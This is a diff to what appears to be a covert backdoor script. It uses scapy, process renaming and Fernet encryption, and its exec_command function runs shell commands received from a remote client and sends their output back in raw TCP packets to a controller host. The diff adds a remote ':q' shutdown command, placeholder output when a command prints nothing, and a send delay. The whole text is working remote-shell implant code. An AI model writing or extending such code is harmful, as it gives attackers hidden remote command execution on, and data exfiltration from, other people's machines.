@@ -5,6 +5,7 @@ from scapy.all import *
 import subprocess
 import setproctitle
 from cryptography.fernet import Fernet
+import time
 import argparse
 
 
@@ -42,18 +43,26 @@ def read_pkt(packet):
 
 
 def exec_command(command):
-    cmd = subprocess.Popen(command.decode("utf-8"), 
-                           shell=True,
-                           stdout=subprocess.PIPE,
-                           stderr=subprocess.PIPE,
-                           stdin=subprocess.PIPE)
+    if command == b":q":
+        print("Shutdown received from remote client...")
+        sys.exit()
+    else:
+        cmd = subprocess.Popen(command.decode("utf-8"), 
+                            shell=True,
+                            stdout=subprocess.PIPE,
+                            stderr=subprocess.PIPE,
+                            stdin=subprocess.PIPE)
 
-    out, errs = cmd.communicate()
-    output = out + errs
+        out, errs = cmd.communicate()
+        output = out + errs
 
-    # Send output back to remote client
-    pkt = IP(dst=args.destination)/TCP(sport=RandShort(), dport=int(args.port))/Raw(load=output)
-    send(pkt, verbose=False)
+        if output.strip() == b"":
+            output = command.decode("utf-8") + " : no output on remote\n"
+
+        # Send output back to remote client
+        pkt = IP(dst=args.destination)/TCP(sport=RandShort(), dport=int(args.port))/Raw(load=output)
+        time.sleep(0.1)
+        send(pkt, verbose=False)
 
 
 def encrypt_data(data):
